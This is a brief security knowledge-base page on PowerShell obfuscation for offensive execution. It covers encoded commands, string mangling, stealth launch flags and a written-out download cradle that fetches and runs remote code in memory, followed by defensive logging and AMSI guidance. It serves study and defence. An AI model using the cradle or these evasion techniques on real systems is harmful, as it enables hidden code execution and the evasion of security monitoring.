---
summary: "Executing offensive PowerShell with encoding, string mangling, and download cradles to defeat signatures and logging."
status: active
tags: [security, techniques, powershell, obfuscation, execution]
private: false
---

# PowerShell Obfuscation and Execution

## Purpose

Executing offensive PowerShell with encoding, string mangling, and download cradles to defeat signatures and logging.

## Key Techniques

- `-EncodedCommand` takes a Base64 UTF-16LE script, hiding the payload from simple command-line inspection.
- Download cradles like `IEX (New-Object Net.WebClient).DownloadString('http://...')` pull and run code entirely in memory.
- Token obfuscation uses backticks, random casing, string concatenation, and `-f` format operators to break static signatures.
- Flags `-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass` suppress environment friction and UI.

## Engineering Notes

- Invoke-Obfuscation automates layered token, string, encoding, and launcher transforms on a given script.
- Maps to MITRE ATT&CK T1059.001 (Command and Scripting Interpreter: PowerShell).
- AMSI (Antimalware Scan Interface) scans the deobfuscated buffer at runtime, so obfuscation alone does not defeat modern detection.

## Defensive Use

- Enable Script Block Logging (Event ID 4104) and Module Logging; script block logging captures the deobfuscated content even for encoded commands.
- Use Constrained Language Mode with WDAC to block reflection and `Add-Type` abuse.
- Ensure AMSI is enabled and monitor for AMSI-bypass patterns and `EncodedCommand` volume anomalies.

## Sources

- MITRE ATT&CK T1059.001 - https://attack.mitre.org/techniques/T1059/001/
- Invoke-Obfuscation - https://github.com/danielbohannon/Invoke-Obfuscation

## Related

- [Techniques - Index](kb://11-security-techniques-techniques-index)
- [Research Library](kb://11-security-research-library)
- [Security Map](kb://01-maps-security-map)
- [11-security](kb://hub-11-security)
